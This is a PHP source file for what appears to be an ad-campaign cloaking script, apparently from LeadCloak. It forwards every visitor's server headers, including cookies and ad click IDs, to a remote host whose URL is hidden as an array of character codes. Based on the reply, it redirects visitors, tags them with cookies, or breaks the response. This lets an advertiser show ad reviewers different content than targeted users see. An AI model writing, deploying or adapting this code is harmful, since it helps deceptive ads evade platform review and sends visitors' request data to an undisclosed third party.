<?php
/**
 * Campaign: StoneTom
 * Created: 2022-01-31 14:23:09 UTC
 */

// ---------------------------------------------------
// Configuration

$campaignId = '169mslq4t3rr';

$campaignSignature = 'tfI3pgxC3aYRuTIAuzGHoVfrqT4F18biMvoBTnRKvBPH8NX0Bu';

// ---------------------------------------------------
// DO NOT EDIT

function httpHandleResponse($response, $logToFile = true)
{
	$decodedResponse = json_decode( $response, true );

	if (is_array($decodedResponse) && array_key_exists('error', $decodedResponse)) {
		if ($logToFile) {
			logToFile( $decodedResponse['error'] . ' ' . $decodedResponse['message']);
		}
		header($_SERVER['SERVER_PROTOCOL']." ".$decodedResponse['error'] ." ".$decodedResponse['message']);
	} else {
		$currentURI = (!empty($_SERVER['HTTPS']) ? 'https' : 'http').'://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];

		file_put_contents(sys_get_temp_dir().DIRECTORY_SEPARATOR.'169mslq4t3rr', $response);

		if ( ! empty($decodedResponse[0]) && ($decodedResponse[0] != $currentURI)) {
            if (!httpTaggedUser() && in_array($decodedResponse[6],[1,3])) {
                httpTagUser($decodedResponse[6], $decodedResponse[4]);
            }

			header( "Location: " . $decodedResponse[0] );

			if ($decodedResponse[5] == true) {
				header('Content-Length: '.rand(1,128));
				exit;
			}

			return true;
		}

        if (!httpTaggedUser() && in_array($decodedResponse[6],[2,3])) {
            httpTagUser($decodedResponse[6], $decodedResponse[4]);
        }

		return false;
	}
}

function httpRequestMakePayload($campaignId, $campaignSignature)
{
    $payload = [];
    array_push($payload, $campaignId, $campaignSignature);

    $h = httpGetHeaders();

    foreach ($h as $k => $v)
    {
        array_push($payload, $v);
    }

    array_push($payload, 'f');

    for ($i = 0; $i < 14; $i++)
    {
        array_push($payload, md5($campaignSignature.uniqid($campaignId)));
    }

    $getKeys = array_keys($_GET);

    $gclid = 0;

    foreach($getKeys as $key)
    {
    	if (preg_match('@gclid|msclkid@i', $key))
	    {
	    	$gclid = $_GET[$key];
	    }
    }

    $payload[] = $gclid;

	for ( $i = 0; $i < 3; $i ++ )
    {
        array_push($payload, md5($campaignSignature . uniqid($campaignId)));
    }

	array_push( $payload, $campaignSignature );

	for ( $i = 0; $i < 1; $i ++ ) {
		array_push( $payload, md5( $campaignSignature . uniqid( $campaignId ) ) );
	}

	array_push($payload, 'pisccl40');

	// Use LPR
	array_push($payload, '0');
	
    return base64_encode(implode('|',$payload));
}

function httpRequestExec($metadata)
{
    if (httpTaggedUser() && file_exists(sys_get_temp_dir().DIRECTORY_SEPARATOR.'169mslq4t3rr'))
    {
        return file_get_contents(sys_get_temp_dir().DIRECTORY_SEPARATOR.'169mslq4t3rr');
    }

    $headers = httpGetAllHeaders();

    $ch = httpRequestInitCall();

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'q='.$metadata);

    curl_setopt($ch, CURLOPT_TCP_NODELAY, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
    curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);

    $http_response = curl_exec($ch);

	$http_status = curl_getinfo( $ch );
	$http_code   = $http_status['http_code'];

	if ( $http_code != 200 ) {
		switch ( $http_code ) {
			case 400:
				$message = 'Bad Request';
			break;

			case 402:
				$message = 'Payment Required';
			break;

			case 417:
				$message = 'Expectation Failed';
			break;

			case 429:
				$message = 'Request Throttled';
			break;

			case 500:
				$message = 'Internal Server Error';
			break;

			default:
				$message = '';
			break;
		}
		$http_response = json_encode( [ 'error' => $http_code, 'message' => $message ] );
	}

    curl_close($ch);

    return $http_response;
}

function httpGetHeaders()
{
    $h = ['HTTP_REFERER' => '', 'HTTP_USER_AGENT' => '', 'SERVER_NAME' => '', 'REQUEST_TIME' => '', 'QUERY_STRING' => ''];

    while(list($key, $value) = each($h))
    {
        $h[$key] = array_key_exists($key, $_SERVER) ? $_SERVER[$key] : $value;
    }

    return $h;
}

function httpGetAllHeaders()
{
	$headers = [];

	foreach ($_SERVER as $header => $value)
	{
		$key       = 'X-LC-' . str_replace('_', '-', $header);
		$value     = is_array($value) ? implode(',', $value) : $value;
		$headers[] = $key . ':' . trim($value);
	}

	$headers[] = 'X-LC-SIG: tfI3pgxC3aYRuTIAuzGHoVfrqT4F18biMvoBTnRKvBPH8NX0Bu';

	return $headers;
}

function httpRequestInitCall()
{
	$s = [104,116,116,112,115,58,47,47,49,48,48,99,102,57,97,52,54,100,49,99,48,50,97,102,51,50,51,51,52,101,54,54,52,54,55,99,54,102,99,99,52,54,101,100,52,56,100,101,54,97,100,46,97,103,105,108,101,107,105,116,46,99,111, 47, 100, 47 ];
    $u = '';
    foreach($s as $v) { $u .=chr($v); }
    $u .= '169mslq4t3rr';

    return curl_init($u);
}

function httpGetIPHeaders ($returnList = false)
{
    if (array_key_exists('HTTP_FORWARDED', $_SERVER))
    {
        return str_replace('@for\=@', '', $_SERVER['HTTP_FORWARDED']);
    }
    else if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER))
    {
        $ipList = array_values(array_filter(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])));

        if (sizeof($ipList) == 1)
        {
            return current($ipList);
        }

        if ($returnList)
        {
            return $ipList;
        }

        foreach ($ipList as $ip)
        {
            $ip = trim($ip);

            /**
             * check if the value is anything other than an IP address
             */
            if ( ! httpIsValidIP($ip))
            {
                continue;
            }
        }
    }
    else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER))
    {
        return $_SERVER["HTTP_CLIENT_IP"];
    }
    else if (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER))
    {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    else if (array_key_exists('REMOTE_ADDR', $_SERVER))
    {
        return $_SERVER["REMOTE_ADDR"];
    }

    return false;
}

function httpIsValidIP($ipAddress)
{
    return (bool) filter_var($ipAddress, FILTER_VALIDATE_IP);
}

function httpTaggedUser()
{
    return array_key_exists('169mslq4t3rr', $_COOKIE) ? $_COOKIE['169mslq4t3rr'] : 0 ;
}

function httpTagUser($type, $life)
{
    setcookie('169mslq4t3rr', $type, time() + $life * 60 * 60 * 24, '/');
}

function isPHPVersionAcceptable() {
	if (PHP_MAJOR_VERSION == 5 && PHP_MINOR_VERSION < 4) {
		return 'Please update your PHP Version to PHP 5.4 or higher to use this application.';
	}

	return true;
}

function isCURLInstalled() {
	if (!in_array('curl',get_loaded_extensions())) {
		return 'This application requires that cURL be installed. Please install cURL to continue.';
	}

	return true;
}
function isJSONInstalled() {
	if (!function_exists('json_encode')) {
		return 'This application requires that the PHP be able to decode JSON. Please enable a JSON for PHP.';
	}

	return true;
}

function isDirectoryWritable() {
	if (!is_readable(dirname(__FILE__))) {
		return 'This application requires to be able to read to this directory for logging purposes. Please change permissions for this directory ('.(dirname(__FILE__)).') to continue.';
	}

	if (!is_writeable(dirname(__FILE__))) {
		return 'This application requires to be able to write to this directory for logging purposes. Please change permissions for this directory ('.(dirname(__FILE__)).') to continue.';
	}

	return true;
}

function isApplicationReadyToRun() {
	print 'Checking application environment...'.nl2br(PHP_EOL);
	$checks = [ isPHPVersionAcceptable(), isCURLInstalled(), isJSONInstalled(), isDirectoryWritable() ];
	$hasErrors = false;

	foreach($checks as $check) {
		if (!is_bool($check)) {
			$hasErrors = true;

			print ' - '.$check.nl2br(PHP_EOL);
		}
	}

	if (empty($hasErrors)) {
		print 'App ready to run!'.nl2br(PHP_EOL).'Set `$enableDebugging` to `false` to continue.';
	}

	die();
}

function logToFile($result)  {
	$date     = date('Y-m-d H:i:s.u');
	$filename = 'leadcloak-log-169mslq4t3rr.log';

	$contents = "[{$date}] Failed: {$result} " . PHP_EOL;

	if (file_exists($filename) && !is_writable($filename))
	{
		// ERROR
		return 'Error writing to log file';
	}

	return file_put_contents($filename, $contents, FILE_APPEND) ? true : false;
}

?>